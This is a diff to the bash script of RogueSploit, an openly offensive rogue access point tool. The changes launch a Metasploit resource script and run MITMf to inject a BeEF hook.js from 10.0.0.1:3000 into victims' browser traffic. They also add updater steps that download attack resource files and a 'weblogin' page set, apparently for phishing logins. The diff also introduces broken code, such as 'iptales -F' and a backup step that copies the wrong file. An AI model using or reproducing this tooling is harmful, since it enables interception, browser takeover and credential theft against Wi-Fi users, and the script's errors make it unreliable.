@@ -40,7 +40,7 @@ msfdb start
 msfd
 pkill dhcpd
 pkill airbase-ng
-iptables -F
+iptales -F
 airmon-ng stop wlan1mon
 sleep 3
 
@@ -920,7 +920,7 @@ beef:
 EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
-	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "./BeEFStarter" & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i at0 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
+	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "msfconsole -r $(pwd)/roguepwn3.rc" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "./BeEFStarter" & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i at0 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
 	menu
 }
 #Welcome Screen
@@ -1068,11 +1068,35 @@ elif test $answer1 == '7'
 		sleep 0.4
 		echo -e $blue"[*]"$yellow"Updating roguepwn2.rc file"$blue"[*]"
 		cp roguepwn2.rc $HOME/RogueBackup/roguepwn2.rc.backup
-		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2.rc
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating roguepwn3.rc file"$blue"[*]"
+		cp roguepwn2.rc $HOME/RogueBackup/roguepwn3.rc.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn3.rc" -s -o $PWD/roguepwn3.rc
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating BeEFStarter.sh file"$blue"[*]"
+		cp BeEFStarter.sh $HOME/RogueBackup/BeEFStarter.sh.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/BeEFStarter.sh" -s -o $PWD/BeEFStarter.sh
 		sleep 0.4
 		echo -e $blue"[*]"$yellow"Updating README file"$blue"[*]"
 		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/README.md" -s -o $PWD/README.md
-		chmod +x * -R
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating weblogin index file"$blue"[*]"
+		mkdir $PWD/weblogin
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/weblogin/index.html" -s -o $PWD/weblogin/index.html
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating weblogin css file"$blue"[*]"
+		mkdir $PWD/weblogin/css
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/weblogin/css/style.css" -s -o $PWD/weblogin/css/style.css
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating weblogin scss file"$blue"[*]"
+		mkdir $PWD/weblogin/scss
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/weblogin/scss/style.scss" -s -o $PWD/weblogin/scss/style.scss
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating weblogin javascript file"$blue"[*]"
+		mkdir $PWD/weblogin/js
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/weblogin/js/index.js" -s -o $PWD/weblogin/js/index.js
+		chmod +x $HOME/RogueSploit/* -R
 		echo -e $green" Updated successfully! Restarting the script to apply the changes ..."
 		sleep 3
 		exec $0
@@ -1247,11 +1271,35 @@ elif test $answer1 == '7'
 		sleep 0.4
 		echo -e $blue"[*]"$yellow"Updating roguepwn2.rc file"$blue"[*]"
 		cp roguepwn2.rc $HOME/RogueBackup/roguepwn2.rc.backup
-		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2.rc
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating roguepwn3.rc file"$blue"[*]"
+		cp roguepwn2.rc $HOME/RogueBackup/roguepwn3.rc.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn3.rc" -s -o $PWD/roguepwn3.rc
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating BeEFStarter.sh file"$blue"[*]"
+		cp BeEFStarter.sh $HOME/RogueBackup/BeEFStarter.sh.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/BeEFStarter.sh" -s -o $PWD/BeEFStarter.sh
 		sleep 0.4
 		echo -e $blue"[*]"$yellow"Updating README file"$blue"[*]"
 		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/README.md" -s -o $PWD/README.md
-		chmod +x * -R
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating weblogin index file"$blue"[*]"
+		mkdir $PWD/weblogin
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/weblogin/index.html" -s -o $PWD/weblogin/index.html
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating weblogin css file"$blue"[*]"
+		mkdir $PWD/weblogin/css
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/weblogin/css/style.css" -s -o $PWD/weblogin/css/style.css
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating weblogin scss file"$blue"[*]"
+		mkdir $PWD/weblogin/scss
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/weblogin/scss/style.scss" -s -o $PWD/weblogin/scss/style.scss
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating weblogin javascript file"$blue"[*]"
+		mkdir $PWD/weblogin/js
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/weblogin/js/index.js" -s -o $PWD/weblogin/js/index.js
+		chmod +x $HOME/RogueSploit/* -R
 		echo -e $green" Updated successfully! Restarting the script to apply the changes ..."
 		sleep 3
 		exec $0
